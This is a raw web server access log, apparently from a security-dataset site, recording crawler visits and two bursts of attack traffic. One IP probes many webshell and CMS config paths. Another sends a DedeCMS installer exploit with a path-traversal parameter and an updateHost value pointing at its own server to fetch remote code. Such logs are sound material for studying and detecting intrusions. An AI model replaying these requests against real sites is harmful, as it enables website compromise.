41.223.160.131 - - [19/Apr/2019:06:56:38 -0700] "GET /tg/tg_snort_fast.7z HTTP/1.1" 304 131 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.149.51 - - [19/Apr/2019:06:57:05 -0700] "GET /self.logs/access.log.2017-01-07.gz HTTP/1.1" 200 17240 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
39.137.67.80 - - [19/Apr/2019:05:54:31 -0700] "GET /Security-Data-Analysis/Lab_1/conn.log.zip HTTP/1.1" 200 339324440 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.81 Safari/537.36" 
223.104.90.89 - - [19/Apr/2019:07:00:35 -0700] "GET /data HTTP/1.1" 404 340 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.4098.3 Safari/537.36" 
61.150.43.52 - - [19/Apr/2019:07:05:37 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0" 
106.11.222.178 - - [19/Apr/2019:07:06:50 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Linux; Android 5.0.2; SM-A5000 Build/LRX22C ) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 Tx(HTAO/3.3.3) WindVane/8.1.0 HTAO(channel/701287@htao_Andorid_3.3.3) 1242x2208" 
106.11.222.244 - - [19/Apr/2019:07:06:52 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Linux; Android 5.0.2; SM-A5000 Build/LRX22C ) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 Tx(HTAO/3.3.3) WindVane/8.1.0 HTAO(channel/701287@htao_Andorid_3.3.3) 1242x2208" 
106.11.222.126 - - [19/Apr/2019:07:07:03 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (Linux; Android 5.0.2; SM-A5000 Build/LRX22C ) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 Tx(HTAO/3.3.3) WindVane/8.1.0 HTAO(channel/701287@htao_Andorid_3.3.3) 1242x2208" 
54.36.150.125 - - [19/Apr/2019:07:10:57 -0700] "GET /self.logs/2015/error.log.2015-08-05.gz HTTP/1.1" 200 999 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
209.190.207.10 - - [19/Apr/2019:07:12:46 -0700] "GET / HTTP/1.1" 304 133 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0" 
54.36.149.90 - - [19/Apr/2019:07:13:03 -0700] "GET /self.logs/error.log.2018-04-03.gz HTTP/1.1" 200 5906 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.11 - - [19/Apr/2019:07:14:58 -0700] "GET /self.logs/2015/error.log.2015-08-31.gz HTTP/1.1" 200 748 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
123.126.113.156 - - [19/Apr/2019:07:19:59 -0700] "GET /robots.txt HTTP/1.1" 301 481 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.126.113.156 - - [19/Apr/2019:07:20:00 -0700] "GET / HTTP/1.1" 301 446 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.126.113.156 - - [19/Apr/2019:07:20:06 -0700] "GET /robots.txt HTTP/1.1" 200 252 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
123.126.113.156 - - [19/Apr/2019:07:21:10 -0700] "GET / HTTP/1.1" 200 12474 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
41.223.160.131 - - [19/Apr/2019:07:21:54 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 304 154 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
54.36.148.60 - - [19/Apr/2019:07:22:29 -0700] "GET /self.logs/access.log.2018-02-09.gz HTTP/1.1" 200 20940 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.76 - - [19/Apr/2019:07:26:28 -0700] "GET /self.logs/access.log.2019-03-03.gz HTTP/1.1" 200 24352 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
216.244.66.245 - - [19/Apr/2019:07:30:35 -0700] "GET /self.logs/access.log.2018-01-06.gz HTTP/1.1" 200 37096 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
157.55.39.176 - - [19/Apr/2019:07:34:58 -0700] "GET /self.logs/access.log.2017-05-18.gz HTTP/1.1" 200 25778 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
174.46.232.2 - - [19/Apr/2019:07:36:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
174.46.232.2 - - [19/Apr/2019:07:36:07 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
174.46.232.2 - - [19/Apr/2019:07:36:07 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
174.46.232.2 - - [19/Apr/2019:07:36:07 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" 
3.88.161.108 - - [19/Apr/2019:07:38:29 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.88.161.108 - - [19/Apr/2019:07:38:29 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.88.161.108 - - [19/Apr/2019:07:38:29 -0700] "GET / HTTP/1.1" 301 482 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
3.88.161.108 - - [19/Apr/2019:07:38:29 -0700] "GET / HTTP/1.1" 200 12510 "-" "CCBot/2.0 (https://commoncrawl.org/faq/)" 
54.36.148.199 - - [19/Apr/2019:07:38:44 -0700] "GET /self.logs/error.log.2019-02-27.gz HTTP/1.1" 200 5572 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [19/Apr/2019:07:39:15 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
106.11.152.57 - - [19/Apr/2019:07:42:26 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 YisouSpider/5.0 Safari/537.36" 
157.55.39.242 - - [19/Apr/2019:07:43:20 -0700] "GET /self.logs/access.log.2019-02-28.gz HTTP/1.1" 200 27281 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
222.186.57.142 - - [19/Apr/2019:07:47:55 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:15 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 295 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:16 -0700] "POST //plus/result.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/result.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:16 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:16 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:19 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 295 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:20 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:20 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:21 -0700] "POST //plus/mytag_js.php?aid=9527 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9527" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:21 -0700] "POST //api.php HTTP/1.1" 404 294 "http://www.secrepo.com//api.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:22 -0700] "POST //lequ.php HTTP/1.1" 404 294 "http://www.secrepo.com//lequ.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:22 -0700] "POST //data/cache/coco.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/coco.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:22 -0700] "POST //data/cache/sw.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/sw.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:22 -0700] "POST //fuck.php HTTP/1.1" 404 294 "http://www.secrepo.com//fuck.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:23 -0700] "POST //inc/config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//inc/config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:23 -0700] "POST //test.php HTTP/1.1" 404 294 "http://www.secrepo.com//test.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:23 -0700] "POST //admin/index.asp HTTP/1.1" 404 294 "http://www.secrepo.com//admin/index.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:24 -0700] "POST //data/data.asp HTTP/1.1" 404 294 "http://www.secrepo.com//data/data.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:24 -0700] "POST //css.asp HTTP/1.1" 404 294 "http://www.secrepo.com//css.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:24 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:25 -0700] "POST //plus/90sec.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/90sec.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
222.186.57.142 - - [19/Apr/2019:07:48:25 -0700] "POST //dest.php HTTP/1.1" 404 294 "http://www.secrepo.com//dest.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
54.36.150.54 - - [19/Apr/2019:07:50:59 -0700] "GET /self.logs/access.log.2018-07-05.gz HTTP/1.1" 200 22395 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.44 - - [19/Apr/2019:07:52:19 -0700] "GET /self.logs/error.log.2017-10-29.gz HTTP/1.1" 200 1629 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
13.66.139.1 - - [19/Apr/2019:07:52:46 -0700] "GET /robots.txt HTTP/1.1" 301 502 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.1 - - [19/Apr/2019:07:52:46 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
13.66.139.0 - - [19/Apr/2019:07:52:58 -0700] "GET /self.logs/access.log.2017-05-11.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
109.201.154.168 - - [19/Apr/2019:07:55:30 -0700] "GET /robots.txt HTTP/1.1" 200 297 "-" "Mozilla/5.0 (compatible; Uptimebot/1.0; +http://www.uptime.com/uptimebot)" 
192.3.57.206 - - [19/Apr/2019:08:00:07 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.0" 200 1279381 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36" 
54.36.149.29 - - [19/Apr/2019:08:00:16 -0700] "GET /self.logs/2016/error.log.2016-08-10.gz HTTP/1.1" 200 633 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.206 - - [19/Apr/2019:08:02:10 -0700] "GET /self.logs/2016/error.log.2016-08-05.gz HTTP/1.1" 200 2253 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.242 - - [19/Apr/2019:08:02:34 -0700] "GET /robots.txt HTTP/1.1" 200 334 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
104.225.146.38 - - [19/Apr/2019:08:05:17 -0700] "GET / HTTP/1.1" 200 12474 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
104.225.146.38 - - [19/Apr/2019:08:05:19 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7391 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
104.225.146.38 - - [19/Apr/2019:08:05:19 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27751 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.148.1 - - [19/Apr/2019:08:05:20 -0700] "GET /self.logs/error.log.2018-09-01.gz HTTP/1.1" 200 5673 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
180.163.220.5 - - [19/Apr/2019:08:05:25 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
104.225.146.38 - - [19/Apr/2019:08:05:26 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 553 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
180.163.220.5 - - [19/Apr/2019:08:05:27 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
180.163.220.66 - - [19/Apr/2019:08:05:28 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36" 
42.236.10.93 - - [19/Apr/2019:08:05:56 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.68 - - [19/Apr/2019:08:05:57 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
42.236.10.78 - - [19/Apr/2019:08:05:59 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
42.236.10.78 - - [19/Apr/2019:08:05:59 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.3 - - [19/Apr/2019:08:06:01 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.3 - - [19/Apr/2019:08:06:02 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
180.163.220.68 - - [19/Apr/2019:08:06:03 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1" 
103.63.2.160 - - [19/Apr/2019:08:07:05 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php HTTP/1.1" 301 714 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [19/Apr/2019:08:07:05 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php HTTP/1.1" 404 295 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=../data/admin/config_update.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [19/Apr/2019:08:07:14 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/ HTTP/1.1" 301 740 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [19/Apr/2019:08:07:14 -0700] "GET /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/ HTTP/1.1" 404 295 "http://secrepo.com/install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=listcd.php&updateHost=http://103.63.2.160/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [19/Apr/2019:08:07:22 -0700] "GET /install/listcd.php HTTP/1.1" 301 534 "http://secrepo.com/install/listcd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
103.63.2.160 - - [19/Apr/2019:08:07:23 -0700] "GET /install/listcd.php HTTP/1.1" 404 295 "http://secrepo.com/install/listcd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
54.36.148.232 - - [19/Apr/2019:08:14:34 -0700] "GET /self.logs/2015/access.log.2015-02-02.gz HTTP/1.1" 200 3300 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
108.59.8.70 - - [19/Apr/2019:08:16:48 -0700] "GET /robots.txt HTTP/1.1" 301 518 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [19/Apr/2019:08:16:49 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [19/Apr/2019:08:16:53 -0700] "GET / HTTP/1.1" 301 442 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [19/Apr/2019:08:16:55 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
108.59.8.70 - - [19/Apr/2019:08:17:05 -0700] "GET / HTTP/1.1" 200 12455 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
40.77.167.58 - - [19/Apr/2019:08:19:07 -0700] "GET /self.logs/access.log.2018-08-20.gz HTTP/1.1" 200 24539 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.176 - - [19/Apr/2019:08:19:12 -0700] "GET /self.logs/access.log.2017-10-24.gz HTTP/1.1" 200 42557 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.242 - - [19/Apr/2019:08:23:29 -0700] "GET /self.logs/access.log.2017-06-19.gz HTTP/1.1" 301 546 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.250 - - [19/Apr/2019:08:23:49 -0700] "GET /self.logs/error.log.2018-02-14.gz HTTP/1.1" 200 3997 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
40.77.167.58 - - [19/Apr/2019:08:28:48 -0700] "GET /self.logs/error.log.2018-04-10.gz HTTP/1.1" 200 7333 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 340 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET / HTTP/1.1" 200 12510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 339 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /apple-touch-icon.png HTTP/1.1" 404 339 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
71.121.210.35 - - [19/Apr/2019:08:29:10 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Safari/13606.4.5.3.1 CFNetwork/902.3.1 Darwin/17.7.0 (x86_64)" 
207.46.13.76 - - [19/Apr/2019:08:32:51 -0700] "GET /self.logs/access.log.2019-03-25.gz HTTP/1.1" 200 42511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.148.237 - - [19/Apr/2019:08:35:04 -0700] "GET /self.logs/access.log.2017-08-10.gz HTTP/1.1" 200 18070 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.200 - - [19/Apr/2019:08:35:07 -0700] "GET /self.logs/2015/error.log.2015-11-08.gz HTTP/1.1" 200 609 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.1 - - [19/Apr/2019:08:35:40 -0700] "GET /self.logs/2015/error.log.2015-03-13.gz HTTP/1.1" 200 767 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
113.171.224.176 - - [19/Apr/2019:08:39:59 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
157.55.39.242 - - [19/Apr/2019:08:40:16 -0700] "GET /self.logs/2015/?C=M;O=D HTTP/1.1" 200 7666 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
40.77.167.58 - - [19/Apr/2019:08:43:11 -0700] "GET /self.logs/?C=S;O=D HTTP/1.1" 200 18370 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
54.36.149.90 - - [19/Apr/2019:08:44:43 -0700] "GET /self.logs/error.log.2017-02-05.gz HTTP/1.1" 200 1273 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
